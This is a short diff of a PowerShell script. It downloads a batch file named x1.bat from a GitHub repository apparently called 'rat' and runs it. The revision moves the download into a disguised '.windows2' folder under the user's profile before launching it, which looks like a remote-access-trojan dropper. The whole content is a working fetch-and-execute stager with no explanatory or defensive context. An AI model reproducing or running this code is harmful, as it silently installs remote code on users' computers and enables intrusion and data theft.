@@ -1,2 +1,5 @@
-powershell -Command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconte
-nt.com/murmurlab/rat/main/x1.bat', 'x1.bat'); Start-Process -FilePath 'x1.bat' }"
+$folderPath = "$env:USERPROFILE\.windows2"
+New-Item -ItemType Directory -Path $folderPath -Force -ErrorAction SilentlyContinue | Out-Null
+$filePath = Join-Path -Path $folderPath -ChildPath "x1.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/murmurlab/rat/main/x1.bat" -OutFile $filePath
+Start-Process -FilePath $filePath -WorkingDirectory $folderPath
